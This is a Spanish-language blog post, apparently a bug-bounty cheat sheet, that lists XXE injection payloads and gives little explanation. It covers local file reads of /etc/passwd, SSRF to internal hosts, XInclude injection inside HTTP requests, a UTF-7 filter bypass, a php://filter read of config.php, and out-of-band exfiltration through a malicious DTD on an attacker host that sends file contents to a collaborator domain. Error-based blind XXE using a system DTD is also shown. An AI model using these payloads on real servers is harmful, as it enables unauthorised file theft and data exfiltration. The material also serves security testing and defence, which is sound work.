---
layout: post
title:  "XXE-Attacks"
author: erik
categories: [ Web ]
image: https://user-images.githubusercontent.com/47476901/158905099-e3bd6d01-a91d-486b-8d64-db4dd55f97cd.png
beforetoc: ""
toc: false
tags: [ Web, Bug Bounty, Payloads ]
---
Algo metodos de inyectar una XXE.

# Table of Contents
1. [Payloads](#XXEpayloads)
2. [SSRF](#XXEaSSRF)
3. [Blind en peticion](#BlindXXE)
4. [Bypass XXE](#XXEBypass)
5. [Out-Of-Band](#OutOFBand)

### 1- XXE payloads <a name="XXEpayloads"></a>
**LFI Test**

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
---
### 2- XXE a SSRF <a name="XXEaSSRF"></a>
**Viendo archivos de un servidor interno**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://192.168.0.1">]>
<foo>&xxe;</foo>
```

---

### 3- XXE blind en peticion <a name="BlindXXE"></a>
**3.1- Ver si existe una XXE sin que se vea en la peticion**
Una forma de identificar una XML blind en una petición: Si la aplicación incrusta los datos enviados en un documento XML y luego se analiza el documento como pasa en una solicitud SOAP de backend. Podemos probar a inyectar XInclude que es una parte de la especificación XML que permite crear un documento XML a partir de subdocumentos, Ej:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>



    POST /product/stock HTTP/1.1
    Host: dominio.com
    Content-Length: 126
    
    productId=1&storeId=1
    ------------------------------
    POST /product/stock HTTP/1.1
    Host: dominio.com
    Content-Length: 126
    
    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

 **3.2- Tambien se podria usar esto en caso de que sea blind**
 ```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>

    POST /product/stock HTTP/1.1
    Host: dominio.com
    Content-Length: 126
    
    productId=1&storeId=1
    ------------------------------
    POST /product/stock HTTP/1.1
    Host: dominio.com
    Content-Length: 126
    
    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://web-atacante.com"/></foo>&storeId=1
```

**3.3- Blind XXE test (Cuando no devuelve valores)**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://subdominio.burpcolaborator.net/?%xxe;">]>
<foo>&blind;</foo>
```
---
### 4- XXE bypass <a name="XXEBypass"></a>
**4.1- XXE UTF-7**

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://web-atacante.com+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

**4.2- Access Control bypass (cargando datos confidenciales)**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY cargar SYSTEM "php://filter/read=convert.base64-encode/resource=http://web-vulnerable.com/config.php">]>
<foo><result>&cargar;</result></foo>
```

---

### 5- Ataques XXE Out-Of-Band: <a name="OutOFBand"></a>

**5.1- EJEMPLO 1**
- Se inyecta en el valor &xxe; en uno de los valores xml que se envian
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://web-atacante.com"> ]>
```

**5.2- EJEMPLO 2**
- Payload que incluiremos completo en el valor xml que se envia. Hará una peticion a la web del atacante, asi podremos saber si realmente procesa la informacion que le mandamos.

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com"> %xxe; ]>
```

**5.3- EJEMPLO 3**
- Este codigo es de http://web-atacante.com/cositas.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://subdominio.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate; 
```

- Inyeccion XML antes de los valores de la pagina, inyectará el codigo de cositas.dtd en la pagina

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com/cositas.dtd"> %xxe;]>
```

**5.4- EJEMPLO 4**
- XXE BLIND basado en mensaje de error
- Este codigo es de http://web-atacante.com/cositas.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///estonoexiste/%file;'>">
%eval;
%error;
```

- Inyeccion XML en la pagina, inyectará el codigo de cositas.dtd 

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-atacante.com/cositas.dtd"> %xxe;]>
```

**5.5- EJEMPLO 5**
- Explotando una XXE abusando de los archivos DTD del sistema, en el archivo llama a ISOamso, usaremos esa variable para explotar la XXE creando un xml personalizado que realice la funcion de llamar al archivo de /etc/passwd que es el objetivo. 

```xml
<!DOCTYPE foo [<!ENTITY % el_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; variable "<!ENTITY &#x26;#x25; errormensaje SYSTEM &#x27;file:///estonoexiste/&#x25;file;&#x27;>">&#x25;variable; &#x25;errormensaje;'>%el_dtd;]>
```
